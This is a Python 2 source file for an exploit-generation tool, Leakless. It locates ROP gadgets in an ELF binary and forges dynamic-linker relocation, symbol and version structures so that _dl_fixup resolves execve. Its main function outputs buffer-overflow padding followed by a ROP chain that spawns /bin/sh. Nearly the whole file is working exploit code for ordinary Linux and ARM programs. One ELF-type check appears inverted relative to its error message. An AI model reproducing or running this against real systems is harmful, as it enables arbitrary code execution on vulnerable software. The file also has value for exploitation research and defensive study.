import os
import sys
import json
import argparse

import elftools.elf.structs
from elftools.elf.elffile import ELFFile
from elftools.elf.constants import P_FLAGS, SH_FLAGS
from elftools.elf.enums import ENUM_E_TYPE

from rangeset import RangeSet

from utils import *
from memory import *

ElfN_Versym_size = 2

relocation_types = {
    "EM_386": 7,
    "EM_X86_64": 7,
    "EM_ARM": 22
}

class Exploit:
    __slots__ = "arch", "little", "pointer_size", "dynstr", "dynsym", \
                "relplt", "plt", "filler", "relocation_type", \
                "dynamic", "versym", "gadgets", "fini"

    def __init__(self):
        self.gadgets = {}
        self.empty_exploit = lambda: ""

    def allocate_helpers(self, buffer):
        pass

    def add_gadget(self, architecture, name, info, gadget):
        """Adds a gadget to the collection of gadgets for the specified architecture."""
        if architecture not in self.gadgets:
            self.gadgets[architecture] = {}
        self.gadgets[architecture][name] = (info, gadget)

    def get_gadget(self, name):
        """Returns the gadget with the specified name for the current architecture"""
        return self.gadgets[self.arch][name]

    def config_from_elf(self, path):
        """Load all the necessary information about the program parsing the ELF
        headers. Furthermore, check some pre-requisites for the exploit to be
        successful."""
        executable_file = open(path, "r")
        elf = ELFFile(executable_file)
        get_section = lambda name: first_or_none(filter(lambda section: section.name == name, elf.iter_sections()))

        # Checks
        if elf.header.e_type == ENUM_E_TYPE["ET_EXEC"]:
            raise Exception("Only non-PIE executables are supported")

        # Binary type
        self.arch = elf.header.e_machine
        self.little = elf.little_endian
        self.pointer_size = elf.elfclass / 8
        self.pointer_format = ("0x%." + str(self.pointer_size * 2) + "x")
        self.structs = elftools.elf.structs.ELFStructs(self.little, self.pointer_size * 8)

        # Useful sections
        self.sections = {section.name: (section.header.sh_addr, section.header.sh_addr + section.header.sh_size) for section in elf.iter_sections()}
        self.plt = get_section(".plt").header.sh_addr
        self.got = get_section(".got").header.sh_addr
        self.gotplt = get_section(".got.plt").header.sh_addr

        # Dynamic section
        dynamic_section = get_section(".dynamic")
        self.writable_dynamic = dynamic_section.header.sh_flags & SH_FLAGS.SHF_WRITE
        self.dynamic = dynamic_section.header.sh_addr
        dynamic_entries = [self.structs.Elf_Dyn.parse(dynamic_entry)
                           for dynamic_entry in
                           chunks(dynamic_section.data(), self.structs.Elf_Dyn.sizeof())]

        # We try not to rely on section names
        get_dynamic = lambda name: first_or_none(map(lambda entry: entry.d_val, filter(lambda entry: entry.d_tag == name, dynamic_entries)))
        self.dynstr = get_dynamic("DT_STRTAB")
        self.dynsym = get_dynamic("DT_SYMTAB")
        self.versym = get_dynamic("DT_VERSYM")
        self.verneed = get_dynamic("DT_VERNEED")
        self.relplt = get_dynamic("DT_JMPREL")
        self.addend = get_dynamic("DT_RELA") is not None

        #
        # Find candidate writeable areas
        #

        # Collect PT_LOAD segments (what gets mapped)
        loaded_segments = filter(lambda segment: segment.header.p_type == "PT_LOAD", elf.iter_segments())
        # Collect the segments which are writeable
        writeable_segments = filter(lambda segment: segment.header.p_flags & P_FLAGS.PF_W, loaded_segments)
        # Get their memory ranges (start, end)
        writeable_ranges = RangeSet.mutual_union(*map(lambda segment: (segment.header.p_vaddr, segment.header.p_vaddr + segment.header.p_memsz), writeable_segments))

        # List of sections we don't want to write to
        dont_overwrite_sections = [self.dynstr, self.dynsym, self.versym, self.relplt, self.dynamic, self.got, self.gotplt]
        # Memory ranges of the sections we don't want to write to
        dont_overwrite_ranges = RangeSet.mutual_union(*[self.sections[self.section_from_address(start)] for start in dont_overwrite_sections])

        # Handle RELRO segment, we don't want to write there
        relro_segment = first_or_none(filter(lambda segment: segment.header.p_type == "PT_GNU_RELRO", elf.iter_segments()))
        if relro_segment is not None:
            dont_overwrite_ranges = dont_overwrite_ranges | RangeSet(relro_segment.header.p_vaddr, relro_segment.header.p_vaddr + relro_segment.header.p_memsz)

        # Compute the set of candidate memory ranges
        self.writeable_ranges = writeable_ranges - dont_overwrite_ranges


        # Save the index of the DT_FINI entry
        fini = filter(lambda (i, entry): entry.d_tag == "DT_FINI", enumerate(dynamic_entries))
        if len(fini) > 0:
            self.fini = self.dynamic + self.structs.Elf_Dyn.sizeof() * fini[0][0]

        # Gadgets
        if self.gadgets.has_key(self.arch):
            executable_segments = filter(lambda segment: segment.header.p_flags  & P_FLAGS.PF_X, elf.iter_segments())

            for name, (info, gadget) in self.gadgets[self.arch].iteritems():
                location = find_string(executable_segments, hex_bytes(gadget))
                if location is None:
                    raise Exception("Can't find gadget " + name)
                self.gadgets[self.arch][name] = (info, gadget, location)

        # Find all '\x00\x00' in non-writeable segments
        self.non_writeable_segments = filter(lambda segment: not (segment.header.p_flags & P_FLAGS.PF_W), loaded_segments)
        self.zero_or_one_addresses = find_all_strings(self.non_writeable_segments, "\x00\x00") + \
                                     find_all_strings(self.non_writeable_segments, "\x01\x00" if self.little else "\x00\x01")

        self.filler = self.ptr2str(reduce(lambda x,y: (x << 32) | 0xdeadb00b, xrange(1 + (self.pointer_size % 4)), 0))
        self.relocation_type = relocation_types[self.arch]

        log(self.dump())

    def get_non_writeable_segment(self, address):
        for non_writeable_segment in self.non_writeable_segments:
            start = non_writeable_segment.header.p_vaddr
            end = start + non_writeable_segment.header.p_memsz
            if (start <= address) and (address < end):
                return non_writeable_segment
        return None

    def read_non_writeable(self, address, size):
        segment = self.get_non_writeable_segment(address)
        if segment is None:
            raise Exception("Not a non-writeable address: " + hex(address))
        start = segment.header.p_vaddr
        end = start + segment.header.p_memsz
        return segment.data()[address - start:address - start + size]

    def section_from_address(self, address):
        for name, section in self.sections.iteritems():
            start = section[0]
            end = section[1]
            if (start <= address) and ((address < end) or ((start > 0) and(end - start == 0))):
                return name
        raise Exception("Can't find a section for address " + hex(address))

    def closest_section_from_address(self, address):
        sorted_sections = [0] + sorted([section[0] for section in self.sections.itervalues()]) + [(1 << 8 * self.pointer_size) - 1]
        for start, end in pairwise(sorted_sections):
            if (start <= address) and (address < end):
                return ("0" if start == 0 else self.section_from_address(start)) + " + " + hex(address - start)
        raise Exception("Can't find a section for address " + hex(address))

    def dump(self):
        """Dump all the information held by this Exploit instance for debugging
        purposes."""
        return "\n".join([slot + ": " + str(getattr(self, slot)) for slot in self.__slots__])

    # Utility functions
    # =================

    def ptr2str(self, integer):
        """Convert a pointer (in the form of an integer) to a byte string of its memory
        representation according the current architecture endianness."""
        string = integer_to_bigendian(integer)
        if self.little:
            return string.rjust(self.pointer_size, "\x00")[::-1]
        else:
            return string.ljust(self.pointer_size, "\x00")

    def str2ptr(self, string):
        """Convert a byte string representing a pointer to an integer."""
        ptr = bigendian_to_integer(string)
        if self.little:
            return int("".join(reversed(list(chunks(ptr, 2)))), 16)
        else:
            return int(ptr, 16)

    # Abstractions to write memory
    # ============================

    def write_string(self, memory_area, string):
        """Write an input string in the specified memory area invoking an appropriate
        number of times the do_writemem function."""
        string_len = len(string)
        if string_len > memory_area.size:
            raise Exception("You're trying to write {} bytes in a MemoryArea {} bytes wide".format(string_len, memory_area.size))

        result = self.empty_exploit()
        remaining = string
        while len(remaining) > 0:
            remaining, writer = self.do_writemem(self.ptr2str(memory_area.start + len(string) - len(remaining)), remaining)
            result += writer

        memory_area.content += string

        return result

    def write_pointer(self, memory_area, pointer):
        """Write a pointer (an integer) to a memory area."""
        return self.write_string(memory_area, self.ptr2str(pointer))

    # Craft data structures for _dl_fixup
    # ===================================

    def jump_to(self, buffer, function_name):
        """Craft the necessary data structures (Elf_Rela?, Elf_Sym, version index) and
        strings to pass to the dynamic linker."""

        # Ensure the function name ends with a '\0'
        if not function_name.endswith("\0"):
            function_name += "\0"

        # Choose between Elf_Rel and Elf_Rela depending on the architecture
        rel_struct = self.structs.Elf_Rela if self.addend else self.structs.Elf_Rel

        # Part of the ROP exploit to write the data structures
        exploit = self.empty_exploit()

        # Allocate the buffers necessary for the data structure we're going to
        # create
        relocation_target = buffer.allocate(self.pointer_size, name="relocation_target")
        function_name_str = buffer.allocate(len(function_name), self.dynstr, 1, name="function_name_str")

        # TODO: move symbol as first thing in the buffer
        if self.versym:
            to_range = lambda address, size: (address, address + size)

            # We have three possible constraints (in order of preference):
            # 1. The version index has special value 0 (local) or 1 (global)
            # 2. The version index falls in a memory area we can write
            # 3. The version index points to ElfN_Verneed structure we can write
            constraints = [lambda address, versym: (sys.stderr.write(hex(versym) + "\n") or 0) + versym in self.zero_or_one_addresses,
                           lambda address, versym: to_range(versym, ElfN_Versym_size) in buffer.ranges,
                           lambda address, versym: (self.get_non_writeable_segment(versym) is not None) and (log("asd " + hex(self.str2ptr(self.read_non_writeable(versym, ElfN_Versym_size)))) or True) and \
                                                   (to_range(self.verneed + self.structs.Elf_Verneed.sizeof() * self.str2ptr(self.read_non_writeable(versym, ElfN_Versym_size)), self.structs.Elf_Verneed.sizeof()) in buffer.ranges)]

            wrap_versym = lambda func: lambda address, index: func(address, self.versym + ElfN_Versym_size * index)
            constraints = map(wrap_versym, constraints)
        else:
            constraints = [lambda x,y: True]

        errors = 0
        for constraint in constraints:
            try:
                symbol = buffer.allocate(self.structs.Elf_Sym.sizeof(), self.dynsym, name="symbol", constraint=constraint)
                break
            except AllocateFailException:
                log("Exc!!")
                errors += 1
                pass

        if self.versym:
            if errors > 2: # We failed
                raise Exception("Can't find a position for the Elf_Sym")
            versym_address = self.versym + ElfN_Versym_size * symbol.index
            if errors == 1: # We can write in ElfN_Versym
                versym_area = buffer.allocate(ElfN_Versym_size, align_to=self.versym, start=versym_address)
                exploit += self.write_string(versym_area, "\x00\x00")
            elif errors == 2: # We can write in ElfN_Verneed
                verneed_address = self.verneed + self.structs.Elf_Verneed.sizeof() * self.str2ptr(self.read_non_writeable(versym_address, ElfN_Versym_size))
                verneed_area = buffer.allocate(self.structs.Elf_Verneed.sizeof(), align_to=self.verneed, start=verneed_address)

                verneed_struct = self.structs.Elf_Verneed.parse("\0" * self.structs.Elf_Verneed.sizeof())
                verneed_struct.vn_version = 1;
                verneed_struct.vn_cnt = 0;
                verneed_struct.vn_file = 0;
                verneed_struct.vn_aux = 0;
                verneed_struct.vn_next = 0;
                exploit += self.write_string(verneed_area, self.structs.Elf_Verneed.build(verneed_struct))

        # Looks like 64-bit and 32-bit have different alignment for the call to _dl_fixup
        reloc_alignment = 1 if self.pointer_size * 8 == 32 else rel_struct.sizeof()
        reloc = buffer.allocate(rel_struct.sizeof(), self.relplt, reloc_alignment, name="reloc")

        # TODO: merge consecutive string writes for possible optimizations
        # Append the creation of the function name string to the exploit
        exploit += self.write_string(function_name_str, function_name)

        # Append the creation of the Elf_Sym structure to the exploit
        function_symbol = self.structs.Elf_Sym.parse("\0" * self.structs.Elf_Sym.sizeof())
        function_symbol.st_name = function_name_str.index
        function_symbol.st_info.bind = "STB_GLOBAL"
        function_symbol.st_info.type = "STT_FUNC"

        exploit += self.write_string(symbol, self.structs.Elf_Sym.build(function_symbol))

        # Append the creation of the Elf_Rela? structure to the exploit
        function_reloc = rel_struct.parse("\0" * rel_struct.sizeof())
        function_reloc.r_offset = relocation_target.start
        function_reloc.r_info_type = self.relocation_type
        function_reloc.r_info_sym = symbol.index

        if self.pointer_size * 8 == 32:
            function_reloc.r_info = function_reloc.r_info_type | (function_reloc.r_info_sym << 8)
        else:
            function_reloc.r_info = function_reloc.r_info_type | (function_reloc.r_info_sym << 32)

        exploit += self.write_string(reloc, rel_struct.build(function_reloc))

        # Return two things: the launch ROP invocation and the data structure
        # set-up ROP chain
        return exploit, reloc.index

class RawDumperExploit(Exploit):
    def __init__(self):
        Exploit.__init__(self)
        self.empty_exploit = lambda: []

    def do_writemem(self, address, value):
        """Write a pointer-sized buffer to the specfied location."""
        return "", [(address, value)]

class CommonGadgetsExploit(Exploit):
    """Mainly add a pool of gadgets common in the various architectures."""
    def __init__(self):
        Exploit.__init__(self)

        # Good for FreeBSD

        # self.add_gadget("EM_386", "writemem", 4,
        #                 " 8b 44 24 08" + # mov    eax,DWORD PTR [esp+0x8] \
        #                 " 8b 4c 24 04" + # mov    ecx,DWORD PTR [esp+0x4] \
        #                 " 89 01" +       # mov    DWORD PTR [ecx],eax \
        #                 " c3")           # ret

        # self.add_gadget("EM_386", "cleanup", 3,
        #                 " 83 c4 0c" + # add    esp,0xc \
        #                 " c3")        # ret

        # Good for Linux

        self.add_gadget("EM_386", "writemem", 4,
                        " 8b 54 24 08" + # mov edx,DWORD PTR [esp+0x8] \
                        " 8b 44 24 04" + # mov eax,DWORD PTR [esp+0x4] \
                        " 89 10"       + # mov DWORD PTR [eax],edx \
                        " c3")           # ret

        self.add_gadget("EM_386", "cleanup", 4,
                        " 5b" + # pop ebx \
                        " 5e" + # pop esi \
                        " 5f" + # pop edi \
                        " 5d" + # pop ebp \
                        " c3")  # ret

        # This gadget requires 6 useless parameters

        self.add_gadget("EM_X86_64", "writemem", 8,
                        " 48 8b 54 24 10" + # mov rdx,QWORD PTR [rsp+0x10] \
                        " 48 8b 44 24 08" + # mov rax,QWORD PTR [rsp+0x8] \
                        " 48 89 10"       + # mov QWORD PTR [rax],rdx \
                        " c3")              # ret

        self.add_gadget("EM_X86_64", "writemem", 8,
                        " 48 89 37"       + # mov    QWORD PTR [rdi],rsi \
                        " c3")              # ret

        self.add_gadget("EM_X86_64", "cleanup", 6,
                        " 5b"    + # pop    rbx \
                        " 5d"    + # pop    rbp \
                        " 41 5c" + # pop    r12 \
                        " 41 5d" + # pop    r13 \
                        " 41 5e" + # pop    r14 \
                        " 41 5f" + # pop    r15 \
                        " c3")     # ret

        self.add_gadget("EM_X86_64", "args", None,
                        " 4c 89 ea" +   # mov    rdx,r13 \
                        " 4c 89 f6" +   # mov    rsi,r14 \
                        " 44 89 ff" +   # mov    edi,r15d \
                        " 41 ff 14 dc") # call   QWORD PTR [r12+rbx*8]

        # Assume LE

        self.add_gadget("EM_ARM", "writemem", 4,
                        " 00 10 80 e5" + # str     r1, [r0] \
                        " 1e ff 2f e1")  # bx      lr

        # Better not use this due to a bug in QEMU

        #self.add_gadget("EM_ARM", "prepare_regs", None,
        #                " f8 85 bd e8")  # pop     {r3, r4, r5, r6, r7, r8, sl, pc}

        self.add_gadget("EM_ARM", "prepare_regs", None,
                        " f8 85 bd 08")  # popeq   {r3, r4, r5, r6, r7, r8, sl, pc}

        self.add_gadget("EM_ARM", "setup_args", None,
                        " 07 00 a0 e1" + # mov     r0, r7 \
                        " 08 10 a0 e1" + # mov     r1, r8 \
                        " 0a 20 a0 e1" + # mov     r2, sl \
                        " 01 40 84 e2" + # add     r4, r4, #1 \
                        " 33 ff 2f e1" + # blx     r3 \
                        " 06 00 54 e1" + # cmp     r4, r6 \
                        " f7 ff ff 1a" + # bne     8604 <__libc_csu_init+0x38> \
                        " f8 85 bd e8")  # pop     {r3, r4, r5, r6, r7, r8, sl, pc}

        self.add_gadget("EM_ARM", "just_ret", None,
                        " 1e ff 2f e1")  # bx      lr

    def allocate_helpers(self, buffer):
        """Allocate helper buffers needed by some specific platforms (e.g. for cleanup
        purposes)"""
        Exploit.allocate_helpers(self, buffer)
        if self.arch == "EM_X86_64":
            self.popret = buffer.allocate(self.pointer_size, name="popret")
            nope, nope, cleanup_location = self.get_gadget("cleanup")
            return self.write_pointer(self.popret, cleanup_location + 8)
        return ""

    def call(self, invocation, parameters):
        """ROP function invocation: return a ROP chain that sets up the arguments on the
        stack and/or on the registers, invoke the function and cleanup the
        arguments."""
        if self.arch == "EM_386":
            return self.call32(invocation, parameters)
        elif self.arch == "EM_X86_64":
            return self.call64(invocation, parameters)
        elif self.arch == "EM_ARM":
            return self.call_arm(invocation, parameters)
        else:
            raise Exception("Unsupported architecture")

    def call32(self, invocation, parameters):
        """Implements the i386 calling convention."""
        cleanup_size, nope, cleanup_location = self.get_gadget("cleanup")
        if len(parameters) > cleanup_size:
            raise Exception("Too many parameters, find a better gadget")

        return invocation + \
               self.ptr2str(cleanup_location) + \
               "".join(map(str, parameters)) + \
               self.filler * (cleanup_size - len(parameters))

    def call64(self, invocation, parameters):
        """Implements the x86_64 calling convention."""
        if len(parameters) > 3:
            raise Exception("Too many parameters")
        elif self.str2ptr(parameters[0]) & 0xffffffff00000000 != 0:
            raise Exception("First parameters high part has to be 0")
        elif len(parameters) == 0:
            return invocation
        elif len(parameters) < 3:
            parameters = parameters + [self.ptr2str(0)] * (3 - len(parameters))

        nope, nope, args_location = self.get_gadget("args")
        nope, nope, cleanup_location = self.get_gadget("cleanup")
        result = self.ptr2str(cleanup_location)
        result += self.ptr2str(0) # rbx
        result += self.ptr2str(1) # rbp == rbx + 1
        result += self.ptr2str(self.fini + 8) # r12, jump to pop;ret
        result += parameters[2] # r13 -> rdx
        result += parameters[1] # r14 -> rsi
        result += parameters[0] # r15 -> edi
        result += self.ptr2str(args_location) # move registers; call pop;ret
        result += self.filler * 7
        result += invocation

        return result

    def call_arm(self, invocation, parameters):
        """Implements the ARM calling convention."""
        if len(parameters) > 3:
            raise Exception("Too many parameters, find a better gadget")
        elif len(parameters) == 0:
            return invocation
        elif len(parameters) < 3:
            parameters = parameters + [self.ptr2str(0)] * (3 - len(parameters))

        nope, nope, prepare_regs_location = self.get_gadget("prepare_regs")
        nope, nope, just_ret_location = self.get_gadget("just_ret")
        nope, nope, setup_args_location = self.get_gadget("setup_args")
        result = self.ptr2str(prepare_regs_location)
        #result += self.ptr2str(just_ret_location) # r3, target of a blx
        result += invocation[0:4] # r3, target of a blx
        result += self.ptr2str(0) # r4
        result += self.filler # r5
        result += self.ptr2str(1) # r6 == r4 + 1
        result += parameters[0] # r7 -> r0
        result += parameters[1] # r8 -> r1
        result += parameters[2] # sl -> r2
        result += self.ptr2str(setup_args_location) # pc
        result += self.filler * 7 # pop again 7 regs + pc
        #result += invocation # pc
        result += invocation[4:] # pc

        return result

    def do_writemem(self, address, value):
        """Write a pointer-sized buffer to the specfied location. This function uses the
        writemem gadget."""
        write_size, nope, location = self.get_gadget("writemem")

        remaining = ""
        if len(value) > write_size:
            remaining = value[write_size:]
            value = value[0:write_size]
        elif len(value) < write_size:
            value = value.ljust(write_size, "\0")

        result = self.call(self.ptr2str(location), [address, value])
        return remaining, result

class ExecveExploit(CommonGadgetsExploit):
    def launch(self, program):
        """Launch an execve("/bin/sh/", &null, &null); exploit."""

        buffer = Buffer(self, self.writeable_ranges)

        binsh_str = program + "\0"

        pointer_to_null = buffer.allocate(self.pointer_size, name="pointer_to_null")
        binsh = buffer.allocate(len(binsh_str), name="binsh")

        exploit = ""

        exploit += self.allocate_helpers(buffer)

        # Pointer to NULL
        exploit += self.write_pointer(pointer_to_null, 0)

        # /bin/sh
        exploit += self.write_string(binsh, binsh_str)

        prepare, reloc_index = self.jump_to(buffer, "execve")

        # Invocation of the dynamic linker resolver (plt[0]) with the
        # appropriate relocation index
        launch = self.ptr2str(self.plt) + self.ptr2str(reloc_index)

        exploit += prepare

        exploit += self.call(launch, [binsh.pointer, pointer_to_null.pointer, pointer_to_null.pointer]) + self.filler

        log(buffer.dump())

        return exploit

def main():
    parser = argparse.ArgumentParser(description='Leakless')
    parser.add_argument('executable', metavar='EXECUTABLE', help='Path to the executable to exploit.', nargs=1)
    parser.add_argument('--json', action='store_true', help="Don't build the ROP chain, just dump on standard output what's necessary for the exploit.")
    parser.add_argument('--debug', action='store_true', help="Print debug information.")
    parser.add_argument('--offset', metavar='OFFSET', type=int, help='Offset to overwrite the saved PC.')
    args = parser.parse_args()

    executable_path = args.executable[0]

    if not args.debug:
        sys.stderr = open(os.devnull, 'w')

    if args.json:
        exploit = RawDumperExploit()
        exploit.config_from_elf(executable_path)
        buffer = Buffer(exploit, exploit.writeable_ranges)
        prepare, relocation_index = exploit.jump_to(buffer, "execve")

        what_to_write = []

        for address, value in prepare:
            what_to_write.append({"address": hex(exploit.str2ptr(address)), "value": value.encode("hex")})

            result = {"write": what_to_write, "dl_address": hex(exploit.plt), "index": relocation_index}

        sys.stdout.write(json.dumps(result, indent=4, sort_keys=True) + "\n")
        return

    if not args.offset:
        log("Please give me the offset to reach the saved PC.")
        sys.exit(-1)

    exploit = ExecveExploit()
    exploit.config_from_elf(executable_path)
    sys.stdout.write("A" * args.offset + exploit.launch("/bin/sh"))

if __name__ == "__main__":
    main()
